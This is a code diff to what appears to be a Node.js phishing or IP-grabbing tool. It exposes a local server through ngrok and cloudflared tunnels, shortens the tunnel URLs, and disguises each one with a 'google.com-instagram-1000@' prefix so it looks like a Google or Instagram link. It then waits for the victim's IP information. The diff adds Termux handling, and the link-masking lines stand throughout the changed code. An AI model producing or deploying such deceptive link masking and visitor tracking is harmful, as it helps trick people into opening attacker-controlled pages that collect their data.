@@ -82,14 +82,16 @@ app.disable("x-powered-by");
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
 	const ngrok = await openNgrok(port);
 	const shortNgrok = await short(ngrok).catch(console.error);
-	const cloudflared = await openCloudflared(port);
-	const shortCf = await short(cloudflared).catch(console.error);
+	const cloudflared = !isTermux ? await openCloudflared(port) : null;
+	const shortCf = !isTermux ? await short(cloudflared).catch(console.error) : null;
+	if (!isTermux) {
+		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
+		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
+		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
+	}
 	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-	console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
-	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-	console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrok}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL 4 > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
 })();
 
@@ -235,7 +237,8 @@ function openNgrok(port) {
 }
 
 function openCloudflared(port) {
-	return new Promise(async resolve => {
+	return new Promise(async (resolve, reject) => {
+		if (isTermux) return reject("Cloudflared is not supported on Termux");
 		let cfUrl;
 		let cfShowed = false;
 		let cfReady = false;
